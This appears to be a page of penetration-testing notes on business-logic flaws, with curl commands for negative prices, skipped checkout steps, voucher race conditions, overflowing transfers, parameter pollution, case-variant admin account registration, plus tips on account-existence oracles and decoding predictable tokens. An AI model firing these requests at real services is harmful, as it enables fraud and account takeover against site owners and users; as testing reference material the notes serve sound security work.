# Business logic, races, workflow abuse

```bash
# negative price / quantity
curl -si -X POST <target>/api/cart $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"item_id":1,"quantity":-100,"price":-99.99}'

# skip workflow steps — straight to final confirmation
curl -si -X POST <target>/api/order/complete $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"order_id":"<id>"}'

# race on single-use codes/vouchers
for i in $(seq 1 15); do
  curl -si -X POST <target>/api/redeem $AUTH_HEADER -H 'Content-Type: application/json' \
    -d '{"code":"VOUCHER"}' &
done; wait

# integer overflow on balances
curl -si -X POST <target>/api/transfer $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"to":"admin","amount":9999999999}'

# HTTP parameter pollution — server may take first, last, or array
curl -si "<target>/api/transfer?to=admin&amount=1000&amount=0" $AUTH_HEADER
curl -si -X POST <target>/api/transfer $AUTH_HEADER -d 'to=admin&amount=1000&amount=0'

# case-normalization shadow account: register Admin@x.com, log in as admin@x.com
curl -si -X POST <target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"Admin","email":"Admin@test.com","password":"Test1234!"}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","email":"admin@test.com","password":"Test1234!"}'
```

## Existence oracles

Registration and other uniqueness-constrained writes leak whether a value exists. A **combined** error (`"Username or email already exists"`) is still a usable oracle: vary only the field you're testing and keep the other unique.

This is the most reliable way to enumerate an account's email when the app hides it — see `auth-jwt.md` § password reset for why side-effect oracles (did an email arrive?) give false negatives.

## Sequential / predictable identifiers

Share tokens, invite codes, order ids, reset tokens: grab one legitimately and check whether it's sequential, a hex/base36 timestamp, or a short hash of something knowable. Decode before assuming randomness:

```bash
python3 -c "print(int('<token>',16))"        # timestamp?
python3 -c "print(int('<token>',36))"
```
